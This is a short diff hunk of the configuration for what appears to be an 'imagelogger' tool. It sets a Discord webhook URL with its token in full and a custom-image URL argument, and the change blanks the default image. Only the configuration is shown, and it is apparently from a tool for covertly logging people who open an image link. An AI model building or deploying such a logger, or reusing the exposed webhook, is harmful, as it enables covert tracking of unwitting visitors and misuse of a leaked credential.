@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1511953562517770281/rOcfXfqiTm8p_kZip0gXey6tBGfrhgCDLvUkmDgvBITmmEY_sp7ijD9KrKJ5qXJ-y2I_",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/9/9a/PNG_transparency_demonstration_2.png", # You can also have a custom image by using a URL argument
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
